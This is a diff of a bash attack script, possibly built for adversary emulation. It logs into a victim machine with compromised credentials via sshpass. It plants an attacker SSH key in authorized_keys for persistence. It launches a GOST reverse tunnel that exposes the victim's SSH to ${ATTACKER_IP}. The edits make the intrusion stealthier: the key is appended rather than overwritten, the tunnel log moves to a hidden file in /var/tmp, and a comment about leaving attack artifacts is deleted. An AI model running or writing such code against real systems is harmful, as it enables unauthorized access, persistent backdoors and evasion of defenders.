@@ -90,7 +90,7 @@ sshpass -p "${COMPROMISED_PASS}" ssh \
   -o UserKnownHostsFile=/dev/null \
   -o LogLevel=ERROR \
   "${COMPROMISED_USER}@${VICTIM_IP}" \
-  'umask 077 && mkdir ~/.ssh && cat > ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys' \
+  'cat >> ~/.ssh/authorized_keys' \
   < "${PERSIST_KEY}.pub"
 
 # ================================================
@@ -121,14 +121,13 @@ sshpass -p "${COMPROMISED_PASS}" ssh \
 # ================================================
 # Remote GOST client on victim
 # ================================================
-# На жертве лог оставляем как реалистичный артефакт атаки.
 
 sshpass -p "${COMPROMISED_PASS}" ssh \
   -o StrictHostKeyChecking=no \
   -o UserKnownHostsFile=/dev/null \
   -o LogLevel=ERROR \
   "${COMPROMISED_USER}@${VICTIM_IP}" \
-  "nohup ~/.local/bin/gost -L rtcp://127.0.0.1:2223/127.0.0.1:22 -F relay://${ATTACKER_IP}:9002 > ~/gost-client.log 2>&1 < /dev/null &"
+  "nohup ~/.local/bin/gost -L rtcp://127.0.0.1:2223/127.0.0.1:22 -F relay://${ATTACKER_IP}:9002 > /var/tmp/.gost-client.log 2>&1 < /dev/null &"
 
 sleep 3
 
